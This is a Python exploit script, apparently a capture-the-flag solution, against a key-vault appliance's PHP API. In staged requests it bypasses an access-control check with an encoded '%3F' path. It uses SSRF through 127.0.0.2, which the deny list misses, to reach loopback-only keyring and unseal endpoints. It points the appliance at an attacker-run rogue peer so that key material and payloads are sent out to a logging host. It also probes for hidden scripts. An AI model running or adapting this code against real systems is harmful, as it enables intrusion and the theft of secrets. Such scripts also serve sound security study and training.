#!/usr/bin/env python3
"""keyring.php and vault_unseal.php check REMOTE_ADDR in PHP, but peer_probe.php and
webhook_test.php don't, so the stage A %3F bypass reaches them. This probes their
GET (P1) and POST (P2) SSRF into loopback, in stages picked with --stage."""
import argparse
import json
import os
import sys
import time
import urllib.parse

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "artifacts")
os.makedirs(OUT, exist_ok=True)
RESULTS = os.path.join(OUT, "probe_endpoints.json")
BASEFILE = os.path.expanduser("~/.ctf/tools/VK-BASE.txt")

S = requests.Session()
LOG = []
DELAY = 0.4


def rec(name, data):
    LOG.append({"name": name, "data": data, "t": time.time()})
    with open(RESULTS, "w") as f:
        json.dump(LOG, f, indent=1)
    print("[*] %-46s %s" % (name, str(data)[:420]), flush=True)


def short(r):
    try:
        return {"code": r.status_code, "json": r.json()}
    except Exception:
        return {"code": r.status_code, "text": r.text[:400]}


def get(base, path, name, tries=2):
    for i in range(tries):
        try:
            r = S.get(base.rstrip("/") + path, timeout=25)
            out = short(r)
            rec(name, out)
            time.sleep(DELAY)
            return out
        except Exception as e:  # noqa: BLE001
            if i == tries - 1:
                rec(name, {"error": repr(e)})
                return {"error": repr(e)}
            time.sleep(2)
    return {}


def post(base, path, body, name, tries=2):
    for i in range(tries):
        try:
            r = S.post(base.rstrip("/") + path, json=body, timeout=25)
            out = short(r)
            rec(name, out)
            time.sleep(DELAY)
            return out
        except Exception as e:  # noqa: BLE001
            if i == tries - 1:
                rec(name, {"error": repr(e)})
                return {"error": repr(e)}
            time.sleep(2)
    return {}


# Stage A ACL bypass path for a script without a PHP-level loopback check.
def bp(script, query=""):
    return "/api/%s.php%%3Fa.php%s" % (script, ("?" + query) if query else "")


def q(u):
    return urllib.parse.quote(u, safe="")


# Stage 1: independent recon requests, run first.
def stage1(base):
    # a 403 "bound to the appliance loopback interface" means the deployed build added the PHP check
    get(base, bp("peer_probe"), "1.peer_probe.noargs")
    get(base, bp("webhook_test"), "1.webhook_test.GET")
    post(base, bp("webhook_test"), {}, "1.webhook_test.POST.noargs")
    # what the deployed build logs; audit_search matches q with stripos
    get(base, "/api/audit.php", "1.audit.tail")
    get(base, "/api/audit_search.php?q=mask&limit=500", "1.audit.q_mask")
    get(base, "/api/audit_search.php?q=cap&limit=500", "1.audit.q_cap")
    # a deployed cluster may name a real peer, and a stored webhook URL may hold a token
    get(base, "/api/webhooks.php", "1.webhooks")
    get(base, "/api/replication.php", "1.replication")
    get(base, "/api/nodes.php", "1.nodes")


# Stage 2: P1 and P2 into loopback-only scripts via 127.0.0.2, which the deny list misses.
LOOPBACK_TARGETS = [
    "http://127.0.0.2/api/status.php",
    "http://127.0.0.2/api/keyring.php",
    "http://127.0.0.2/api/vault_unseal.php",
]


def stage2(base, ref=None):
    for t in LOOPBACK_TARGETS:
        get(base, bp("peer_probe", "peer=" + q(t)), "2.peer_probe " + t)
    if ref:
        t = "http://127.0.0.2/api/vault_unseal.php?ref=" + ref
        get(base, bp("peer_probe", "peer=" + q(t)), "2.peer_probe unseal+ref")
    for t in LOOPBACK_TARGETS:
        post(base, bp("webhook_test"), {"url": t, "event": "maintenance.x"},
             "2.webhook_test " + t)
    if ref:
        # does vault_unseal branch on the method? Compare `bytes` with the GET above
        post(base, bp("webhook_test"),
             {"url": "http://127.0.0.2/api/vault_unseal.php?ref=" + ref,
              "event": "maintenance.x"},
             "2.webhook_test unseal+ref POST")


# Stage 3: extra peer_probe parameters, named after words in the handout source.
PEER_PARAMS = ["peer", "url", "target", "node", "host", "ref", "handshake",
               "token", "unseal", "slot"]


def stage3(base, peer_url, ref=None):
    for p in PEER_PARAMS:
        extra = "peer=" + q(peer_url) + "&" + p + "=" + q(ref or "node-b")
        get(base, bp("peer_probe", extra), "3.peer_probe +%s" % p)


# Stage 4: does peer_probe send key material to a rogue peer? Needs a public --peer URL.
def stage4(base, peer_url, ref=None):
    get(base, bp("peer_probe", "peer=" + q(peer_url)), "4.peer_probe rogue")
    if ref:
        get(base, bp("peer_probe", "peer=" + q(peer_url + "?ref=" + ref)),
            "4.peer_probe rogue+ref")
    # the rogue peer logs the full sample payload webhook_test POSTs
    post(base, bp("webhook_test"), {"url": peer_url, "event": "maintenance.x"},
         "4.webhook_test rogue")
    # re-reading vault_unseal needs a redirector, so check the audit log instead
    get(base, "/api/audit.php", "4.audit.after")


# Stage 5: Apache's 403 page marks a protected script; php-fpm's 404 marks a missing one.
NAMES = ["vault_unseal", "vault_seal", "unseal", "reseal", "seal", "escrow",
         "recovery", "unlock", "provision", "bootstrap", "maintenance",
         "maintainer", "operator", "rotate", "cap", "capability", "mask",
         "peer_handshake", "handshake", "quorum", "shard", "internal",
         "private", "debug", "health"]


def stage5(base):
    for n in NAMES:
        r = get(base, "/api/%s.php" % n, "5.exists %s" % n)
        code = r.get("code")
        if code not in (403, 404):
            rec("5.INTERESTING %s" % n, r)


PEER_JSON = ('{"service":"vk-keyring","appliance":"vaultkeeper","version":"4.2.1",'
             '"node":"node-b","slot":"operator","seal":"open","unseal":"ok",'
             '"handshake":"ok","peer_ok":true,"alg":"aes-128-gcm"}')


def catch_peer():
    """Serve PEER_JSON through ctf-catch, which logs each request, and return its URL."""
    import subprocess
    with open("/tmp/vkpeer.json", "w") as f:
        f.write(PEER_JSON)
    try:
        subprocess.run([os.path.expanduser("~/.ctf/bin/ctf-catch"), "serve", "/tmp/vkpeer.json"],
                       capture_output=True, timeout=20)
        url = subprocess.run([os.path.expanduser("~/.ctf/bin/ctf-catch"), "url"],
                             capture_output=True, timeout=20,
                             text=True).stdout.strip()
        return url + "/s/vkpeer.json" if url.startswith("http") else None
    except Exception:  # noqa: BLE001
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=None)
    ap.add_argument("--peer", default=None,
                    help="public rogue-peer URL. Defaults to the running "
                         "ctf-catch host, which logs headers and body.")
    ap.add_argument("--ref", default=None, help="unseal_ref from keyring")
    ap.add_argument("--stage", default="1,2,4,3,5")
    ap.add_argument("--delay", type=float, default=0.4)
    a = ap.parse_args()

    global DELAY
    DELAY = a.delay
    if not a.peer:
        a.peer = catch_peer()
    base = a.base
    if not base and os.path.exists(BASEFILE):
        base = open(BASEFILE).read().strip().splitlines()[0].strip()
    if not base:
        sys.exit("no base URL: pass --base or wait for %s" % BASEFILE)
    print("[+] base %s" % base, flush=True)

    stages = set(a.stage.split(","))
    if "1" in stages:
        stage1(base)
    if "2" in stages:
        stage2(base, a.ref)
    if "3" in stages:
        stage3(base, a.peer or "http://127.0.0.2/api/status.php", a.ref)
    if "4" in stages and a.peer:
        stage4(base, a.peer, a.ref)
    if "5" in stages:
        stage5(base)
    print("[+] saved %s" % RESULTS)


if __name__ == "__main__":
    main()
